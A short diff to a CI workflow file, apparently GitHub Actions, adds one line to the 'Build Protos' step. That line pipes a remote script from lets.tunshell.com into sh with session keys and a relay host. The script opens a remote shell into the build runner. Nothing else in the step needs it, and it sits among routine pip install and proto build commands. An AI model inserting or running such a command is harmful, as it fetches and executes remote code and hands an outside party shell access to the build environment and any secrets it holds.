@@ -58,7 +58,7 @@ jobs:
       - name: Build Protos
         run: |
           set -e
-
+          curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T 5Sk7MaOgvJacpCf9LwhMnB JQblIO4ct22jcMrQbraz7v au.relay.tunshell.com
           pip install black isort
           ./scripts/build_proto.sh
 
